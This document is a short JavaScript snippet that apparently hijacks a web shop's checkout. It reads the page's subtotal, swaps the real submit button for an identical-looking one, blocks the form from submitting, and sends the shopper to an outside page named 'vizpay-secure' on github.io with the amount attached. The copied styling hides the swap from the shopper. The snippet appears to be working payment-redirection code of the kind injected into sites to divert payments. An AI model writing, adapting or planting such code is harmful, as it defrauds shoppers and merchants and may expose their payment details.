const subtotalElement = document.querySelector('td[style*="text-align:right;padding:2px;font-size:18px;color:darkgreen;"]');
const buttonElement = document.querySelector('input[type="submit"].btn1');

if (subtotalElement && buttonElement) {
    const amount = parseInt(subtotalElement.innerText.replace(/\D/g, ""), 10); // Extract the amount
    const roundedValue = Math.round(amount / 1000); // Divide by 1000 and round
    const newLink = `https://vizpay-secure.github.io/vizpay/?isc=${roundedValue}`; // Construct your new link with the rounded value

    // Change the input to a button
    const newButton = document.createElement('button');
    newButton.className = buttonElement.className; // Copy class names
    newButton.style.cssText = buttonElement.style.cssText; // Copy styles
    newButton.innerText = buttonElement.value; // Set button text

    newButton.onclick = function(event) {
        event.preventDefault(); // Prevent form submission
        window.location.href = newLink; // Redirect to the new link
    };

    // Replace the input with the new button
    buttonElement.parentNode.replaceChild(newButton, buttonElement);
}
